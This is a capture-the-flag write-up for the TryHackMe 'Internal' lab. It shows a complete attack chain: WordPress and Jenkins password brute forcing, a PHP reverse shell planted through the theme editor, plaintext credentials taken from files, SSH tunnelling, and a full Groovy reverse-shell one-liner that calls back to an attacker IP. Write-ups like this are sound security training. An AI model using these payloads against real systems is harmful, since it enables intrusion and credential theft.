---
title: THM - Internal
tags: [thm, wordpress, ssh tunneling, jenkins] 
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg" alt="Challenge logo" style="height:150px;">
</div>

As usual, we start with a simple nmap port scan

```
$ nmap -sC -sV 10.10.175.236

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:85:76:62:20:47 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services reachable. Let's start with port 80. Nothing more interesting rather than the Apache default page. 

![](/assets/img/internal-apache-page.PNG) 

Start enumerating all hidden directories with gobuster.

```
$ gobuster dir -u http://10.10.175.236/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
```

`/blog` seems interesting. Let's navigate to it.

![](/assets/img/internal-blog.PNG)

Seems like a Wordpress blog. We can use wpscan to enumerate any Wordpress site. We start searching for any vulnerable plugin

```
$ wpscan --url http://10.10.175.236/blog/ -e vp

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
```

wpscan was able to identify that Wordpress version is `5.4.2` and found 15 possibile vulnerabilities. Wpscan was not able to find any active plugin. We start enumerating the users

```
$ wpscan --url http://10.10.175.236/blog/ -e u

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

`admin` was identified as an existing user. We can try to find his password from a common dictionary. 

```
$ wpscan --url http://10.10.175.236/blog/ --passwords /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

We successfully bruteforce `admin`'s password. Let's log in the application from the `wp-login.php` page. We get redirected to `internal.thm` and the web browser printed an error. 

![](/assets/img/internal-domain-name.PNG) 

We can solve this issue by editing `/etc/hosts` and by appending the following line

```
10.10.175.236   internal.thm
```

Refresh the page content and log in another time. Looking at the posts we can find an admin's private post with some cleartext credentials.

![](/assets/img/internal-blog-post.PNG) 

We are admin so we can spawn a reverse shell editing a PHP page from the blog. Let's navigate to the Dashboard, click on "Appearance" and then on "Theme Editor". On the right click on the 404.php page and modify its content with a PHP revshell. As usual you can find the source code from the [PentestMonkey's repository](https://github.com/pentestmonkey/php-reverse-shell). Remember to modify the IP address and the port field. Click on "Update file".

Start a netcat listener and navigate to `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

```
$ nc -lvnp 4242

Listening on [0.0.0.0] (family 0, port 4242)
Connection from 10.10.175.236 58284 received!
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:29:33 up 41 min,  0 users,  load average: 0.00, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Stabilize the shell and start the privesc routine. Inside `/opt` there is a text file which contains some credentials

```
www-data@internal:/opt$ cat wp-save.txt 

Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Try to substitute our user to `aubreanna`.

```
www-data@internal:/opt$ su auberanna
Password:

aubreanna@internal:/opt$ 
```

Let's get the user flag

```
aubreanna@internal:~$ cat user.txt 

THM{int3rna1_[redacted]}
```

Inside the same directory we can find this text file

```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

Take a look at which services are running on localhost

```
aubreanna@internal:/opt$  ss -tlnp

State           Recv-Q          Send-Q          Local Address:Port              Peer Address:Port                      
LISTEN          0               80              127.0.0.1:3306                  0.0.0.0:*                         
LISTEN          0               128             127.0.0.1:8080                  0.0.0.0:*                         
LISTEN          0               128             127.0.0.53%lo:53                0.0.0.0:*                         
LISTEN          0               128             0.0.0.0:22                      0.0.0.0:*                         
LISTEN          0               128             127.0.0.1:36865                 0.0.0.0:*                         
LISTEN          0               128             *:80                            *:*                         
LISTEN          0               128             [::]:22                         [::]:* 
```

We can use SSH to access Jenkins on our machine. Let's create a SSH tunnel

```
$ ssh -L 8080:localhost:8080 aurebeanna@10.10.175.236
```

We can now access Jenkins on `localhost:8080`

![](/assets/img/internal-jenkins.PNG)

We can use this Metasploit module to bruteforce the admin's password (you can also use hydra).

```
$ msfconsole -q

msf5> use auxiliary/scanner/http/jenkins_login
msf5 auxiliary(scanner/http/jenkins_login) > set RHOST localhost
msf5 auxiliary(scanner/http/jenkins_login) > set RPORT 8080
msf5 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf5 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
msf5 auxiliary(scanner/http/jenkins_login) > run

[+] 127.0.0.1:8080 - Login Successful: admin:spongebob
```

Let's log in. 

![](/assets/img/internal-jenkins-admin.PNG) 

Click on "Manage Jenkins" and find "Script Console". Type the following Groovy sh revshell and start a netcat listener on you machine. Remember to change the IP address and port. 

```
String host="10.10.96.106";int port=9999;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

When ready, click on "Run" and get the connection back.

```
$ nc -lvnp 9999

Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.175.236 34654 received!
```

After stabilizing our shell we can take a look if there is something useful to elevate our privileges.

```
jenkins@jenkins:/opt$ cat note.txt

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Log into the machine throught SSH with the root credentials we just found.

```
root@internal:~# cat root.txt 

THM{d0ck3r_[redacted]}
```